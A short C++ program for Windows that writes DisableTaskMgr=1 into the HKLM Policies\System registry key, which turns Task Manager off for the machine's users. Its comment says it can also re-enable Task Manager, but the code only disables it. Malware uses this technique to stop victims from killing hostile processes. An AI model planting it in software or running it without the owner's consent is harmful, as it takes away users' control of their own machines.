#include <Windows.h>
#include <iostream>

using namespace std;

// Function to disable/enable Task Manager through Windows Registry
void BlockTaskManager() {
    // Registry key handle
    HKEY hKey;
    
    // Attempt to open the System Policies registry key
    LONG result = RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",  0, KEY_SET_VALUE, &hKey);

    // If the key doesn't exist, create it
    if (result == ERROR_FILE_NOT_FOUND) {
        RegCreateKeyEx(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, NULL, 0, KEY_SET_VALUE, NULL, &hKey, NULL);
    }

    // Set the DisableTaskMgr value
    // value = 1: Task Manager is disabled
    // value = 0: Task Manager is enabled
    DWORD value = 1;
    RegSetValueEx(hKey, L"DisableTaskMgr", 0, REG_DWORD, (const BYTE*)&value, sizeof(value));

    // Close the registry key handle
    RegCloseKey(hKey);
}

int main() {
    BlockTaskManager();
    return 0;
}